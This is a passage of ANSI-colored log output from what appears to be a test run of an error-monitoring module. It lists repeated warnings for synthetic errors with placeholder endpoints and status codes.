WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.912555Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4178'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.912603Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4179'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.912652Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4180'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.912700Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4181'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.912748Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4182'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.912795Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4183'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.912843Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4184'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.912939Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4185'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913015Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4186'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913072Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4187'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913123Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4188'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913173Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4189'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913222Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4190'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913270Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4191'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913319Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4192'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913367Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4193'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913415Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4194'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913463Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4195'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913522Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4196'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913571Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4197'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913620Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4198'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913668Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m84[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4199'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913717Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4200'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913770Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4201'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913823Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4202'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913874Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4203'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913928Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4204'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.913977Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4205'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.914026Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4206'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.914074Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4207'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.914123Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4208'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.914173Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4209'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.914273Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4210'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.914355Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4211'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.914415Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4212'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.914471Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4213'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.914523Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4214'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.914577Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4215'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.914627Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4216'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.914676Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m85[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4217'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
